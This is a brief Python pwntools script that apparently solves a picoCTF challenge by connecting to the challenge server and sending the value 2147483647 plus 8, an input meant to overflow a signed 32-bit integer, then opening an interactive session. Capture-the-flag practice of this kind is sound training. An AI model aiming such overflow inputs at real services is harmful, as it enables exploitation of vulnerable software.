#!/usr/bin/python3

from pwn import *

r = remote("saturn.picoctf.net",65304)

r.sendline(b'2147483647 ' + b'8')
r.interactive()
